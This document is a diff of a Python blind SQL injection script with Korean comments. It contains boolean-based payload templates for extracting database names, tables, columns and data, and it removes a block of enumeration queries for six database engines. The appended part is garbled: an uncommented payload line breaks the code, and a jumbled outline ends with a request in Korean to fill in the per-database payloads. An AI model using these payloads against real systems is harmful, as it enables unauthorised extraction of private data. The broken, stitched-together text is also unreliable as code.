@@ -13,7 +13,7 @@ sleep_time = 1.0  # 요청 간 지연 시간 (초)
 
 db_type = None
 
-# SQL Injection 페이로드 템플릿 설정 (각 데이터베이스에 맞게)
+# SQL Injection 페이로드 템플릿 설정(payload 설정)
 payload_templates = {
     "mysql": {
         "database_name": "1 AND SUBSTRING(DATABASE(), {i}, 1) = '{char}' --",
@@ -62,44 +62,8 @@ payload_templates = {
 #    - 데이터베이스에서 여러 값을 한번에 반환받기 위해 사용됩니다.
 # 4. "AND EXISTS" 구문: "1 AND EXISTS(SELECT 1 FROM table_name WHERE 조건문) --"
 #    - 특정 조건에 해당하는 데이터가 존재하는지 여부를 판별하는 데 사용됩니다.
-#
-# 각 데이터베이스별 데이터베이스 이름, 테이블 이름, 컬럼 이름, 데이터 추출하는 구문 예시:
-# MySQL:
-# - 데이터베이스 이름: "SELECT DATABASE()"
-# - 테이블 이름: "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()"
-# - 컬럼 이름: "SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'"
-# - 데이터 추출: "SELECT {column_name} FROM {table_name}"
-#
-# MSSQL:
-# - 데이터베이스 이름: "SELECT DB_NAME()"
-# - 테이블 이름: "SELECT name FROM sys.tables"
-# - 컬럼 이름: "SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{table_name}')"
-# - 데이터 추출: "SELECT {column_name} FROM {table_name}"
-#
-# Oracle:
-# - 데이터베이스 이름: "SELECT sys_context('userenv','db_name') FROM dual"
-# - 테이블 이름: "SELECT table_name FROM all_tables WHERE owner=USER"
-# - 컬럼 이름: "SELECT column_name FROM all_tab_columns WHERE table_name=UPPER('{table_name}')"
-# - 데이터 추출: "SELECT {column_name} FROM {table_name}"
-#
-# PostgreSQL:
-# - 데이터베이스 이름: "SELECT current_database()"
-# - 테이블 이름: "SELECT table_name FROM information_schema.tables WHERE table_schema='public'"
-# - 컬럼 이름: "SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'"
-# - 데이터 추출: "SELECT {column_name} FROM {table_name}"
-#
-# SQLite:
-# - 데이터베이스 이름: "SELECT name FROM sqlite_master WHERE type='database'"
-# - 테이블 이름: "SELECT name FROM sqlite_master WHERE type='table'"
-# - 컬럼 이름: "PRAGMA table_info('{table_name}')"
-# - 데이터 추출: "SELECT {column_name} FROM {table_name}"
-#
-# DB2:
-# - 데이터베이스 이름: "SELECT CURRENT SERVER FROM sysibm.sysdummy1"
-# - 테이블 이름: "SELECT tabname FROM syscat.tables WHERE tabschema=current_schema"
-# - 컬럼 이름: "SELECT colname FROM syscat.columns WHERE tabname='{table_name}'"
-# - 데이터 추출: "SELECT {column_name} FROM {table_name}"
 
+1. "CASE WHEN" 구문: "1 AND CASE WHEN (조건문) THEN 1 ELSE 0 END = 1 --"
 # 참/거짓 판별 함수
 def is_true_response(response):
     return true_response_indicator in response.text
@@ -233,3 +197,47 @@ def main():
 # 프로그램 실행
 if __name__ == "__main__":
     main()
+    
+    <<해당 코드에 # 다양한 SQL 구문 예시 주석 처리:
+# 1. "CASE WHEN" 구문: "1 AND CASE WHEN (조건문) THEN 1 ELSE 0 END = 1 --"
+#1)myssql
+#1-1)database_name:
+#1-2)table_name:
+#1-3)coulumn_name:
+#1-4)column_data
+
+#2)mssql
+#2)myssql
+#2-1)database_name:
+#2-2)table_name:
+#2-3)coulumn_name:
+#2-4)column_data
+
+#3)oracle
+#3-1)database_name:
+#3-2)table_name:
+#3-3)coulumn_name:
+#3-4)column_data
+
+#4)postgresql
+#4)myssql
+#4-1)database_name:
+#4-2)table_name:
+#4-3)coulumn_name:
+#4-4)column_data
+
+#5)sqlite
+#1)myssql
+#5-1)database_name:
+#5-2)table_name:
+#5-3)coulumn_name:
+#5-4)column_data
+
+#6)db2
+#6)myssql
+#6-1)database_name:
+#6-2)table_name:
+#6-3)coulumn_name:
+#6-4)column_data
+
+해당 질문에 구문 채워줘
